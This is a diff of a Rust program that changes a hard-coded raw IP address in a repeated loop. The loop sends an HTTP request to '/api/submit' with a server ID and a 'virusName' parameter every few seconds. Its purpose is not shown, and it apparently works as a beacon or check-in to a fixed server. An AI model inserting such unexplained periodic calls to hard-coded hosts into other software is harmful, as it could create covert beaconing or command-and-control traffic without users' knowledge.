@@ -18,7 +18,7 @@ fn main() {
 
     loop {
         let mut args: Vec<String> = env::args().collect();
-        let url = format!("http://68.183.100.83:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
+        let url = format!("http://142.93.124.107:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
         let mut core = tokio_core::reactor::Core::new().unwrap();
         let handle = core.handle();
         let client = Client::new(&handle);
@@ -27,7 +27,7 @@ fn main() {
         thread::sleep(time::Duration::from_millis(3000));
 
         let mut args: Vec<String> = env::args().collect();
-        let url = format!("http://68.183.100.83:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
+        let url = format!("http://142.93.124.107:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
         let mut core = tokio_core::reactor::Core::new().unwrap();
         let handle = core.handle();
         let client = Client::new(&handle);
@@ -36,7 +36,7 @@ fn main() {
         thread::sleep(time::Duration::from_millis(3000));
 
         let mut args: Vec<String> = env::args().collect();
-        let url = format!("http://68.183.100.83:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
+        let url = format!("http://142.93.124.107:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
         let mut core = tokio_core::reactor::Core::new().unwrap();
         let handle = core.handle();
         let client = Client::new(&handle);
@@ -45,7 +45,7 @@ fn main() {
         thread::sleep(time::Duration::from_millis(3000));
 
         let mut args: Vec<String> = env::args().collect();
-        let url = format!("http://68.183.100.83:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
+        let url = format!("http://142.93.124.107:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
         let mut core = tokio_core::reactor::Core::new().unwrap();
         let handle = core.handle();
         let client = Client::new(&handle);
@@ -54,7 +54,7 @@ fn main() {
         thread::sleep(time::Duration::from_millis(3000));
 
         let mut args: Vec<String> = env::args().collect();
-        let url = format!("http://68.183.100.83:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
+        let url = format!("http://142.93.124.107:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
         let mut core = tokio_core::reactor::Core::new().unwrap();
         let handle = core.handle();
         let client = Client::new(&handle);
@@ -63,7 +63,7 @@ fn main() {
         thread::sleep(time::Duration::from_millis(3000));
 
         let mut args: Vec<String> = env::args().collect();
-        let url = format!("http://68.183.100.83:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
+        let url = format!("http://142.93.124.107:8080/api/submit?id={}&virusName=0", serverID.trim()).parse::<hyper::Uri>().unwrap();
         let mut core = tokio_core::reactor::Core::new().unwrap();
         let handle = core.handle();
         let client = Client::new(&handle);
